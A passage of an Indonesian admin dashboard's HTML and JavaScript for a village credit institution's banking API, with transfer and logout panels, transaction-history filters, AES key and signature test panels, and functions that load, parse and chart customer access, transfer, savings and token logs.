            <div><div class="field-row"><label>Keterangan</label><input type="text" id="trx-tbank-ket" placeholder="Pembayaran..."/></div></div>
          </div>
          <div style="display:flex;gap:8px;margin-top:8px">
            <button class="btn btn-secondary" onclick="trxExec('transfer-bank-inquiry')"><i class="fas fa-check-circle"></i> Inquiry</button>
            <button class="btn btn-primary" onclick="trxConfirmPosting('transfer-bank-posting')"><i class="fas fa-paper-plane"></i> Posting</button>
          </div>
          <div id="trx-result-transfer-bank-inquiry" style="margin-top:10px;display:none"></div>
          <div id="trx-result-transfer-bank-posting" style="margin-top:10px;display:none"></div>
        </div>

        <!-- LOGOUT -->
        <div id="trx-op-logout" class="trx-op-panel" style="display:none">
          <div class="separator"></div>
          <div class="section-title" style="margin-bottom:8px"><i class="fas fa-sign-out-alt"></i> Logout Sesi</div>
          <button class="btn btn-primary" onclick="trxExec('logout')"><i class="fas fa-sign-out-alt"></i> Logout Sekarang</button>
          <div id="trx-result-logout" style="margin-top:10px;display:none"></div>
        </div>
      </div>
    </div>
  </div>

  <!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
       SECTION: RIWAYAT TRANSAKSI
  \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
  <div id="section-trx-history" class="section content">
    <div class="section-title"><i class="fas fa-history"></i> Riwayat Transaksi</div>
    <div class="panel" style="margin-bottom:16px">
      <div class="panel-header">
        <div class="panel-header-left"><h3><i class="fas fa-filter mr-2"></i>Filter</h3></div>
        <button class="btn btn-primary btn-sm" onclick="loadTrxHistory()"><i class="fas fa-sync-alt"></i> Muat</button>
      </div>
      <div class="panel-body">
        <div class="grid-4">
          <div><div class="field-row"><label>Tipe Log</label>
            <select id="th-type">
              <option value="transfer-AB">Transfer AB (Bank)</option>
              <option value="transfer-AR">Transfer AR (LPD)</option>
              <option value="access">Akses Login</option>
              <option value="tabungan">Tabungan</option>
            </select>
          </div></div>
          <div><div class="field-row"><label>Tanggal</label><input type="date" id="th-date"/></div></div>
          <div><div class="field-row"><label>Filter Teks</label><input type="text" id="th-search" placeholder="nomor rekening, nominal..."/></div></div>
          <div style="display:flex;align-items:flex-end;padding-bottom:10px"><button class="btn btn-secondary" onclick="loadTrxHistory()"><i class="fas fa-search"></i> Cari</button></div>
        </div>
      </div>
    </div>
    <div class="panel">
      <div class="panel-header">
        <div class="panel-header-left">
          <h3><i class="fas fa-list mr-2"></i>Hasil</h3>
          <span class="badge" id="th-count">0</span>
        </div>
      </div>
      <div id="th-log-list" style="padding:12px">
        <div class="empty-state"><i class="fas fa-search"></i><div>Pilih filter dan klik Muat</div></div>
      </div>
    </div>
  </div>

  <!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
       SECTION: CRYPTO TEST
  \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
  <div id="section-crypto-ops" class="section content">
    <div class="section-title"><i class="fas fa-lock"></i> Crypto Operations Test</div>
    <div class="info-box info-teal">
      <i class="fas fa-shield-alt"></i>
      Operasi kriptografi berjalan di Cloudflare Edge menggunakan Web Crypto API.
      Tidak ada proxy ke sandbox \u2014 semua operasi 100% edge-native.
    </div>

    <div class="grid-2">
      <div class="panel">
        <div class="panel-header"><div class="panel-header-left"><h3><i class="fas fa-clock mr-2"></i>Timestamp Jakarta</h3></div></div>
        <div class="panel-body">
          <button class="btn btn-primary" onclick="cryptoTest('timestamp')"><i class="fas fa-sync-alt"></i> Get Timestamp</button>
          <div id="result-timestamp" style="margin-top:10px;display:none"></div>
        </div>
      </div>
      <div class="panel">
        <div class="panel-header"><div class="panel-header-left"><h3><i class="fas fa-key mr-2"></i>Generate AES Keys</h3></div></div>
        <div class="panel-body">
          <div class="field-row">
            <label>Client ID</label>
            <input type="text" id="cto-clientid" value="AQ3A.240912.001.01102025120205"/>
          </div>
          <div class="field-row">
            <label>Timestamp</label>
            <input type="text" id="cto-ts" placeholder="2026-04-20 11:44:20"/>
          </div>
          <button class="btn btn-primary" onclick="cryptoTest('keygen')"><i class="fas fa-cogs"></i> Generate Keys</button>
          <div id="result-keygen" style="margin-top:10px;display:none"></div>
        </div>
      </div>
      <div class="panel">
        <div class="panel-header"><div class="panel-header-left"><h3><i class="fas fa-fingerprint mr-2"></i>Encode X-CLIENT-ID</h3></div></div>
        <div class="panel-body">
          <div class="field-row">
            <label>Client ID Raw</label>
            <input type="text" id="cto-did-cid" value="AQ3A.240912.001.01102025120205"/>
          </div>
          <div class="field-row">
            <label>Timestamp</label>
            <input type="text" id="cto-did-ts" placeholder="2026-04-20 11:44:20"/>
          </div>
          <button class="btn btn-primary" onclick="cryptoTest('did-encode')"><i class="fas fa-code"></i> Encode DID</button>
          <div id="result-did-encode" style="margin-top:10px;display:none"></div>
        </div>
      </div>
      <div class="panel">
        <div class="panel-header"><div class="panel-header-left"><h3><i class="fas fa-signature mr-2"></i>Generate Signature</h3></div></div>
        <div class="panel-body">
          <div class="field-row">
            <label>AES CS (dari keygen)</label>
            <input type="text" id="cto-sig-cs" placeholder="EueZ6DfS18s="/>
          </div>
          <div class="field-row">
            <label>Client ID Encoded</label>
            <input type="text" id="cto-sig-cid" placeholder="U01ZU2V6G3C7CWtV..."/>
          </div>
          <button class="btn btn-primary" onclick="cryptoTest('signature')"><i class="fas fa-pencil-alt"></i> Generate Sig</button>
          <div id="result-signature" style="margin-top:10px;display:none"></div>
        </div>
      </div>
    </div>
  </div>

</main>

<script>
/* \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
   STATE & HELPERS
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 */
let hourlyChart = null, endpointChart = null, dailyChart = null;

function todayStr() {
  const d = new Date();
  return d.toISOString().slice(0,10);
}

function fmtTime(s) {
  // Extract timestamp from log entry text
  const m = s.match(/\\[(\\d{4}-\\d{2}-\\d{2}\\s+\\d{2}:\\d{2}:\\d{2})\\]/);
  return m ? m[1] : '\u2014';
}

function extractEndpoint(text) {
  const m = text.match(/POST\\s+(https?:\\/\\/[^\\n]+)/);
  if (m) {
    const url = m[1].trim();
    const parts = url.split('/');
    return parts.slice(-3).join('/');
  }
  return '\u2014';
}

function extractDataBody(text) {
  const m = text.match(/DATA:\\s*([\\s\\S]*?)(?=\\[\\d{4}|$)/);
  if (m && m[1].trim()) return m[1].trim();
  return '';
}

function escH(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function showSection(name) {
  document.querySelectorAll('.section').forEach(el => el.classList.remove('active'));
  document.querySelectorAll('#sidebar nav a').forEach(el => el.classList.remove('active'));
  document.getElementById('section-' + name)?.classList.add('active');
  document.getElementById('nav-' + name)?.classList.add('active');
  const titles = {
    'dashboard': '<i class="fas fa-tachometer-alt mr-2"></i>Overview',
    'activity': '<i class="fas fa-chart-line mr-2"></i>Aktivitas Harian',
    'logs-access': '<i class="fas fa-sign-in-alt mr-2"></i>Log Akses Nasabah',
    'logs-transfer': '<i class="fas fa-exchange-alt mr-2"></i>Log Transfer',
    'logs-tabungan': '<i class="fas fa-piggy-bank mr-2"></i>Log Tabungan',
    'logs-token': '<i class="fas fa-key mr-2"></i>Log Token',
    'stats': '<i class="fas fa-chart-bar mr-2"></i>Statistik API',
    'errors': '<i class="fas fa-exclamation-triangle mr-2"></i>Error Log',
    'crypto-ops': '<i class="fas fa-lock mr-2"></i>Crypto Test',
    'trx': '<i class="fas fa-terminal mr-2"></i>Jalankan Transaksi',
    'trx-history': '<i class="fas fa-history mr-2"></i>Riwayat Transaksi',
  };
  document.getElementById('topbar-title').innerHTML = titles[name] || name;
  closeSidebar();
  return false;
}

function toggleSidebar() {
  document.getElementById('sidebar').classList.toggle('open');
  document.getElementById('sidebar-overlay').classList.toggle('show');
}
function closeSidebar() {
  document.getElementById('sidebar').classList.remove('open');
  document.getElementById('sidebar-overlay').classList.remove('show');
}

function updateClock() {
  const now = new Date();
  const wib = new Date(now.getTime() + 7*3600000);
  const ts = wib.toISOString().replace('T',' ').slice(0,19);
  document.getElementById('sidebar-time').textContent = ts + ' WIB';
  document.getElementById('topbar-date').textContent = ts + ' WIB';
}

/* \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
   API CALLS
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 */
async function callAdmin(payload) {
  const r = await fetch('/api/admin', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify(payload)
  });
  return r.json();
}

async function callCrypto(payload) {
  const r = await fetch('/api/crypto', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify(payload)
  });
  return r.json();
}

/* \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
   PARSE LOG ENTRIES
   Format: [YYYY-MM-DD HH:MM:SS] local.INFO: \\nREQUEST:\\n...
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 */
function parseLogEntries(text) {
  // Split on timestamp markers
  const chunks = text.split(/(?=\\[\\d{4}-\\d{2}-\\d{2}\\s+\\d{2}:\\d{2}:\\d{2}\\])/);
  return chunks.filter(c => c.trim().length > 5).map(chunk => {
    const ts = fmtTime(chunk);
    const endpoint = extractEndpoint(chunk);
    const data = extractDataBody(chunk);
    const isResponse = chunk.includes('RESPONSE');
    const isError = chunk.toLowerCase().includes('local.error') || chunk.toLowerCase().includes('exception');
    return { ts, endpoint, data, raw: chunk.trim(), isResponse, isError };
  });
}

function renderLogEntries(entries, containerId, searchText = '') {
  const el = document.getElementById(containerId);
  if (!entries || entries.length === 0) {
    el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><div>Tidak ada log ditemukan</div></div>';
    return 0;
  }
  const filtered = searchText
    ? entries.filter(e => e.raw.toLowerCase().includes(searchText.toLowerCase()))
    : entries;
  
  el.innerHTML = filtered.slice(0, 200).map((e, i) => {
    const method = e.raw.includes('POST ') ? '<span class="method-tag method-post">POST</span>' :
                   e.raw.includes('GET ') ? '<span class="method-tag method-get">GET</span>' : '';
    const typeTag = e.isResponse
      ? '<span class="badge-pill badge-info">RESPONSE</span>'
      : e.isError
        ? '<span class="badge-pill badge-err">ERROR</span>'
        : '<span class="badge-pill badge-ok">REQUEST</span>';
    const endpointShort = e.endpoint.length > 50 ? e.endpoint.slice(-50) : e.endpoint;
    return \`<div class="log-entry">
      <div class="log-entry-header" onclick="toggleLog(this)">
        <div style="display:flex;align-items:center;gap:8px;min-width:0;flex:1">
          \${method} \${typeTag}
          <span style="font-family:monospace;font-size:10px;color:#94a3b8;white-space:nowrap">\${e.ts}</span>
          <span style="font-size:11px;color:#7dd3fc;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">\${escH(endpointShort)}</span>
        </div>
        <i class="fas fa-chevron-down" style="color:#334155;font-size:10px;flex-shrink:0;margin-left:8px"></i>
      </div>
      <div class="log-entry-body"><pre>\${escH(e.raw)}</pre></div>
    </div>\`;
  }).join('');
  return filtered.length;
}

function toggleLog(header) {
  const body = header.nextElementSibling;
  const icon = header.querySelector('.fa-chevron-down,.fa-chevron-up');
  body.classList.toggle('show');
  if (icon) {
    icon.classList.toggle('fa-chevron-down');
    icon.classList.toggle('fa-chevron-up');
  }
}

/* \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
   DASHBOARD LOAD
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 */
async function loadDashboard() {
  const today = todayStr();

  // Load today's access log
  try {
    const accRes = await callAdmin({ op: 'read-log', path: \`access-\${today}.txt\`, dir: 'root' });
    if (accRes.ok && accRes.content) {
      const entries = parseLogEntries(accRes.content).filter(e => !e.isResponse);
      document.getElementById('stat-total-access').textContent = entries.length;
      document.getElementById('stat-access-sub').textContent = 'Login/Logout hari ini';
      const recent = entries.slice(-5).reverse();
      document.getElementById('badge-recent-access').textContent = entries.length;
      document.getElementById('recent-access-body').innerHTML = recent.map(e =>
        \`<tr><td class="ts">\${e.ts.slice(11)}</td><td class="url">\${escH(e.endpoint)}</td>
         <td><span class="badge-pill badge-ok">OK</span></td></tr>\`
      ).join('') || '<tr><td colspan="3" style="text-align:center;color:#475569;padding:10px">\u2014</td></tr>';
    } else {
      document.getElementById('stat-total-access').textContent = '0';
      document.getElementById('stat-access-sub').textContent = 'Belum ada log';
    }
  } catch(e) {
    document.getElementById('stat-total-access').textContent = '?';
  }

  // Load today's transfer log
  try {
    const trRes = await callAdmin({ op: 'read-log', path: \`transfer-AB-\${today}.txt\`, dir: 'root' });
    if (trRes.ok && trRes.content) {
      const entries = parseLogEntries(trRes.content).filter(e => !e.isResponse);
      document.getElementById('stat-total-transfer').textContent = entries.length;
      document.getElementById('stat-transfer-sub').textContent = 'Transfer LPD (AB) hari ini';
      const recent = entries.slice(-5).reverse();
      document.getElementById('badge-recent-transfer').textContent = entries.length;
      document.getElementById('recent-transfer-body').innerHTML = recent.map(e => {
        const body = e.data;
        const amtMatch = body.match(/"amount":"([^"]+)"/);
        return \`<tr><td class="ts">\${e.ts.slice(11)}</td><td class="url">\${escH(e.endpoint)}</td>
               <td class="mono" style="font-size:10px">\${amtMatch ? '\u{1F512} enc' : '\u2014'}</td></tr>\`;
      }).join('') || '<tr><td colspan="3" style="text-align:center;color:#475569;padding:10px">\u2014</td></tr>';
    } else {
      document.getElementById('stat-total-transfer').textContent = '0';
      document.getElementById('stat-transfer-sub').textContent = 'Belum ada log';
      document.getElementById('recent-transfer-body').innerHTML = '<tr><td colspan="3" style="text-align:center;color:#475569;padding:10px">\u2014</td></tr>';
    }
  } catch(e) {
    document.getElementById('stat-total-transfer').textContent = '?';
  }

  // Load today's token log
  try {
    const tokRes = await callAdmin({ op: 'read-log', path: \`token-\${today}.txt\`, dir: 'root' });
    if (tokRes.ok && tokRes.content) {
      const entries = parseLogEntries(tokRes.content);
      document.getElementById('stat-total-token').textContent = entries.length;
      document.getElementById('stat-token-sub').textContent = 'Token request hari ini';
    } else {
      document.getElementById('stat-total-token').textContent = '0';
      document.getElementById('stat-token-sub').textContent = 'Belum ada log';
    }
  } catch(e) {
    document.getElementById('stat-total-token').textContent = '?';
  }

  // Load log files overview
  try {
    const filesRes = await callAdmin({ op: 'list-logs' });
    if (filesRes.ok) {
      document.getElementById('stat-total-errors').textContent = filesRes.error_count || '\u2014';
      document.getElementById('stat-error-sub').textContent = '7 hari terakhir';
      renderLogFilesOverview(filesRes.files);
    }
  } catch(e) {}
}

function renderLogFilesOverview(files) {
  if (!files || files.length === 0) return;
  const grouped = {};
  files.forEach(f => {
    const g = f.dir || 'root';
    if (!grouped[g]) grouped[g] = [];
    grouped[g].push(f);
  });
  
  const html = Object.entries(grouped).map(([dir, flist]) => \`
    <div style="margin-bottom:12px">
      <div style="font-size:10px;font-weight:700;color:#0d6b65;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px">
        <i class="fas fa-folder-open mr-1"></i> \${dir === 'root' ? 'storage/logs/' : 'storage/logs/' + dir + '/'}
      </div>
      <div style="display:flex;flex-wrap:wrap;gap:4px">
        \${flist.slice(0,20).map(f => \`<span class="tag" title="\${f.name}">\${f.name}</span>\`).join('')}
        \${flist.length > 20 ? \`<span class="tag" style="color:#64748b">+\${flist.length-20} lainnya</span>\` : ''}
      </div>
    </div>
  \`).join('');
  document.getElementById('log-files-overview').innerHTML = html;
}

/* \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
   ACTIVITY SECTION
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 */
async function loadActivity() {
  const date = document.getElementById('act-date').value || todayStr();
  const type = document.getElementById('act-type').value;
  const filter = document.getElementById('act-filter').value.toLowerCase();

  // Build filename
  let filename = '';
  let dir = 'root';
  if (type === 'access') { filename = \`access-\${date}.txt\`; }
  else if (type === 'transfer-AR') { filename = \`transfer-AR-\${date}.txt\`; }
  else if (type === 'transfer-AB') { filename = \`transfer-AB-\${date}.txt\`; }
  else if (type === 'tabungan') { filename = \`tabungan-\${date}.txt\`; }
  else if (type === 'token') { filename = \`token-\${date}.txt\`; }

  document.getElementById('activity-log-list').innerHTML = '<div style="text-align:center;padding:20px;color:#475569"><span class="spinner"></span> Memuat...</div>';

  const res = await callAdmin({ op: 'read-log', path: filename, dir });
  if (!res.ok) {
    document.getElementById('activity-log-list').innerHTML = \`<div class="info-box info-yellow"><i class="fas fa-exclamation-triangle"></i> \${res.error || 'File tidak ditemukan: ' + filename}</div>\`;
    document.getElementById('badge-act-total').textContent = '0';
    document.getElementById('badge-act-entries').textContent = '0';
    return;
  }

  const entries = parseLogEntries(res.content);
  const filtered = filter ? entries.filter(e => e.raw.toLowerCase().includes(filter)) : entries;
  document.getElementById('badge-act-total').textContent = filtered.length;
  document.getElementById('badge-act-entries').textContent = filtered.length;

  // Hourly chart
  const hourCounts = Array(24).fill(0);
  filtered.forEach(e => {
    const h = parseInt(e.ts.slice(11,13));
    if (!isNaN(h)) hourCounts[h]++;
  });
  renderHourlyChart(hourCounts);

  // Endpoint chart
  const epCount = {};
  filtered.forEach(e => {
    const ep = e.endpoint.split('/').slice(-1)[0] || 'unknown';
    epCount[ep] = (epCount[ep] || 0) + 1;
  });
  renderEndpointChart(epCount);

  // Log list
  const count = renderLogEntries(filtered, 'activity-log-list', '');
  if (filtered.length === 0) {
    document.getElementById('activity-log-list').innerHTML = \`<div class="empty-state"><i class="fas fa-inbox"></i><div>Tidak ada log untuk \${filename}</div></div>\`;
  }
}

function renderHourlyChart(data) {
  const ctx = document.getElementById('chart-hourly').getContext('2d');
  if (hourlyChart) hourlyChart.destroy();
  hourlyChart = new Chart(ctx, {
    type: 'bar',
    data: {
      labels: Array.from({length:24}, (_,i) => i+'h'),
      datasets: [{
        data,
        backgroundColor: 'rgba(20,184,166,.6)',
        borderColor: '#14b8a6',
        borderWidth: 1,
        borderRadius: 3,
      }]
    },
    options: {
      responsive: true, maintainAspectRatio: false,
      plugins: { legend: { display: false } },
      scales: {
        x: { ticks: { color: '#475569', font: { size: 9 } }, grid: { color: '#1e293b' } },
        y: { ticks: { color: '#475569', font: { size: 9 } }, grid: { color: '#1e293b' } }
      }
    }
  });
}

function renderEndpointChart(data) {
  const ctx = document.getElementById('chart-endpoint').getContext('2d');
  if (endpointChart) endpointChart.destroy();
  const sorted = Object.entries(data).sort((a,b)=>b[1]-a[1]).slice(0,8);
  endpointChart = new Chart(ctx, {
    type: 'doughnut',
    data: {
      labels: sorted.map(e=>e[0]),
      datasets: [{ data: sorted.map(e=>e[1]),
        backgroundColor: ['#14b8a6','#a78bfa','#34d399','#fbbf24','#60a5fa','#f87171','#fb923c','#818cf8'],
        borderWidth: 1, borderColor: '#0f172a' }]
    },
    options: {
      responsive: true, maintainAspectRatio: false,
      plugins: { legend: { position: 'right', labels: { color: '#94a3b8', font: { size: 9 }, boxWidth: 10, padding: 8 } } }
    }
  });
}

/* \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
   ACCESS LOGS
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 */
async function loadAccessLogs() {
  const date = document.getElementById('acc-date').value || todayStr();
  const source = document.getElementById('acc-source').value;
  const search = document.getElementById('acc-search').value;
  
  let filename = \`access-\${date}.txt\`;
  let dir = source;
  if (source === 'his') { dir = 'his'; }

  document.getElementById('access-log-list').innerHTML = '<div style="text-align:center;padding:20px;color:#475569"><span class="spinner"></span></div>';
  
  const res = await callAdmin({ op: 'read-log', path: filename, dir });
  if (!res.ok) {
    document.getElementById('access-log-list').innerHTML = \`<div class="info-box info-yellow"><i class="fas fa-info-circle"></i> \${res.error || 'File tidak ditemukan'}</div>\`;
    document.getElementById('badge-acc-count').textContent = '0';
    return;
  }
  const entries = parseLogEntries(res.content);
  const count = renderLogEntries(entries, 'access-log-list', search);
  document.getElementById('badge-acc-count').textContent = count;
}

/* \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
   TRANSFER LOGS
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 */
async function loadTransferLogs() {
  const date = document.getElementById('tr-date').value || todayStr();
  const type = document.getElementById('tr-type').value;
  const source = document.getElementById('tr-source').value;
  const search = document.getElementById('tr-search').value;
  
  let filename = '';
  if (type === 'AR') filename = \`transfer-AR-\${date}.txt\`;
  else if (type === 'AB') filename = \`transfer-AB-\${date}.txt\`;
  else filename = \`transfer-in-\${date}.txt\`;
  let dir = source;

  document.getElementById('transfer-log-list').innerHTML = '<div style="text-align:center;padding:20px;color:#475569"><span class="spinner"></span></div>';
  
  const res = await callAdmin({ op: 'read-log', path: filename, dir });
  if (!res.ok) {
    document.getElementById('transfer-log-list').innerHTML = \`<div class="info-box info-yellow"><i class="fas fa-info-circle"></i> \${res.error || 'File tidak ditemukan'}</div>\`;
    document.getElementById('badge-tr-count').textContent = '0';
    return;
  }
  const entries = parseLogEntries(res.content);
  const count = renderLogEntries(entries, 'transfer-log-list', search);
  document.getElementById('badge-tr-count').textContent = count;
}

/* \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
   TABUNGAN LOGS
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 */
async function loadTabunganLogs() {
  const date = document.getElementById('tab-date').value || todayStr();
  const search = document.getElementById('tab-search').value;
  const filename = \`tabungan-\${date}.txt\`;

  document.getElementById('tabungan-log-list').innerHTML = '<div style="text-align:center;padding:20px;color:#475569"><span class="spinner"></span></div>';
  
  const res = await callAdmin({ op: 'read-log', path: filename, dir: 'root' });
  if (!res.ok) {
    document.getElementById('tabungan-log-list').innerHTML = \`<div class="info-box info-yellow"><i class="fas fa-info-circle"></i> \${res.error || 'File tidak ditemukan'}</div>\`;
    document.getElementById('badge-tab-count').textContent = '0';
    return;
  }
  const entries = parseLogEntries(res.content);
  const count = renderLogEntries(entries, 'tabungan-log-list', search);
  document.getElementById('badge-tab-count').textContent = count;
}

/* \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
   TOKEN LOGS
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 */
